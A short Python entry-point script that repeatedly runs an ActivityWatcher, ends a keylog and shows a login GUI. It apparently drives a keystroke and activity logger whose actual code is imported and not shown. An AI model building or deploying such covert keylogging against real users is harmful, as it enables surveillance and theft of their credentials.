from logger.dependencies import *


def main():
    while True:
        aw = ActivityWatcher()
        aw.watch()
        aw.end_keylog()
        LoginGui.show_login()


if __name__ == "__main__":
    main()
